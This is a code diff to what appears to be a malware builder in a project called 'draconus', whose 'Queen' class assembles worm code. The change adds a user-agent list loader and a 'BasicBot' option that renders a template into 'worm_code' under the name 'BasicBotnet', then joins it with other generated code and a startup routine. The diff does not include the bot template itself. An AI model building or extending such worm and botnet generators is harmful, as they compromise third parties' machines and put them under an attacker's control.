@@ -2,7 +2,7 @@ import os
 
 from jinja2 import Template
 
-from ..CONFIG import APP_DIRECTORY, SYS_MSG_HEADERS, CLIENT_PAUSE_CONNECTION
+from ..CONFIG import APP_DIRECTORY, SYS_MSG_HEADERS, CLIENT_PAUSE_CONNECTION, EXTRAS_DIR
 
 
 class Queen:
@@ -11,6 +11,24 @@ class Queen:
         self.templates_dir = os.path.join(APP_DIRECTORY, "draconus", "hive", "templates")
         self.make_dirs()
         self._template = {}
+        self.tags = {
+            "user_agent" : os.path.join(EXTRAS_DIR, "user_agents.txt")
+        }
+    
+    def loader(self, tag):
+        data = []
+        with open(self.tags[tag], "r") as f:
+            for line in f.readlines():
+                if line.startswith("#") or line == "\n":
+                    continue
+                data.append(line)
+        return data
+    
+    def load_file(self, fpath):
+        with open(fpath, "r") as f:
+            data = f.read()
+        return data
+
 
 
     def make_dirs(self):
@@ -79,6 +97,13 @@ class Queen:
             acode = self._make_adv_worm(**config)
             name = "AdvTest"
             worm_code = ""
+        elif config["SERV_TYPE"] == "BasicBot":
+            temp_path = os.path.join(self.templates_dir, "basicbot.py")
+            tempb = self.load_file(temp_path)
+            tempb = Template(tempb)
+            user_agent = self.loader("user_agent")
+            worm_code = tempb.render(USER_AGENT=user_agent)
+            name = "BasicBotnet"
         startup = self._make_startup(config["SERV_TYPE"])
         fcode = bcode + acode + worm_code + startup
  
